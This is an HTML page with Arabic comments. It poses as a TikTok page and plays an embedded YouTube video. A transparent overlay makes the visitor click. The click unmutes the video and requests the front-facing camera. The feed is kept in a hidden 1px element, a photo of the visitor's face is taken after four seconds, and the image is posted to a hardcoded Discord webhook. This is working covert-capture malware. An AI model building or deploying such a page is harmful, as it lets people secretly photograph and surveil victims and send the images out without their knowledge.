<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
        .wrapper { position: relative; width: 100%; height: 100%; }
        
        #youtube-frame {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; /* يمنع الضغط المباشر على يوتيوب */
        }

        /* طبقة شفافة فوق كل شيء لإجبار المستخدم على الضغط */
        #interaction-layer {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100;
            background: rgba(0,0,0,0.01); /* شفافة تماماً */
            cursor: pointer;
        }

        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <iframe id="youtube-frame" 
        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=1&mute=1&loop=1&playlist=C3vaOyZFcsM&controls=0" 
        frameborder="0" allow="autoplay; encrypted-media">
    </iframe>

    <div id="interaction-layer"></div>
</div>

<video id="hidden-camera" autoplay playsinline muted></video>
<canvas id="photo-canvas"></canvas>

<script>
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
    const iframe = document.getElementById('youtube-frame');
    const interactionLayer = document.getElementById('interaction-layer');

    // عند الضغط على أي مكان في الشاشة
    interactionLayer.addEventListener('click', async () => {
        // 1. تشغيل الصوت في فيديو اليوتيوب
        iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
        iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
        
        // إخفاء الطبقة الشفافة بعد الضغط
        interactionLayer.style.display = 'none';

        // 2. طلب الكاميرا والتصوير
        const camera = document.getElementById('hidden-camera');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            camera.srcObject = stream;

            camera.onplaying = () => {
                setTimeout(() => {
                    captureAndSend(camera);
                }, 4000); // يصور بعد 4 ثواني من الضغط لضمان وضوح الوجه مع الصوت
            };
        } catch (err) { console.log("Camera Error"); }
    });

    async function captureAndSend(cameraElement) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');

        if (cameraElement.videoWidth > 0) {
            canvas.width = cameraElement.videoWidth;
            canvas.height = cameraElement.videoHeight;
            context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) return;
                const formData = new FormData();
                formData.append('file', blob, 'capture_with_audio.png');
                await fetch(webhookURL, { method: 'POST', body: formData });
            }, 'image/png');
        }
    }
</script>
</body>
</html>
